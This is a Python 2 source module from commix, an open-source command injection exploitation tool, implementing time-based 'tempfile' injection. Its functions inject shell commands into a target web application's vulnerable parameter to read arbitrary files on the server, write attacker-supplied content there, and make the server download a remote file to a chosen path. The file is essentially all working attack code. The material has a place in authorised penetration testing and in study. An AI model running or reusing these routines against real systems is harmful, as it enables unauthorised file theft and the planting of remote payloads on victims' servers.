#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""
   
      
"""
Read a file from the target host.
"""
def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
  file_to_read = menu.options.file_read
  # Execute command
  cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
  shell = output 
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n\n (!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : ")
    sys.stdout.flush()
    print shell
  else:
   sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
   sys.stdout.flush()
     

"""
Write to a file on the target host.
"""
def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
  else:
    sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
    sys.stdout.flush()
    
  if not settings.TMP_PATH in menu.options.file_dest:
    file_name = os.path.split(menu.options.file_dest)[1]
    dest_to_write = settings.TMP_PATH + file_name
  else:
    dest_to_write = menu.options.file_dest
  
  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest
  OUTPUT_TEXTFILE = dest_to_write
  
  # Execute command
  cmd = settings.FILE_WRITE + " '"+ content + "' "
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
  shell = output
  shell = "".join(str(p) for p in shell)
  
  # Check if file exists!
  cmd = "echo $(ls " + dest_to_write + ")"
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
  shell = output
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
    sys.stdout.flush()
  else:
   sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
   sys.stdout.flush()


"""
Upload a file on the target host.
"""
def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
  file_to_upload = menu.options.file_upload
    
  # check if remote file exists.
  try:
    urllib2.urlopen(file_to_upload)
  except urllib2.HTTPError, err:
    sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    sys.exit(0)

  if not settings.TMP_PATH in menu.options.file_dest:
    file_name = os.path.split(menu.options.file_dest)[1]
    dest_to_upload = settings.TMP_PATH + file_name
  else:
    dest_to_upload = menu.options.file_dest
  
  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
  else:
    dest_to_upload = menu.options.file_dest
  OUTPUT_TEXTFILE = dest_to_upload
  
  # Execute command
  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
  shell = output
  shell = "".join(str(p) for p in shell)
  
  ## Check if file exists!
  cmd = "echo $(ls " + dest_to_upload + ")"
  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
  shell = output
  shell = "".join(str(p) for p in shell)
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
    sys.stdout.flush()
  else:
   sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
   sys.stdout.flush()


"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
  if menu.options.file_read:
    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)

  if menu.options.file_write:
    file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)

  if menu.options.file_upload:
    file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)

# eof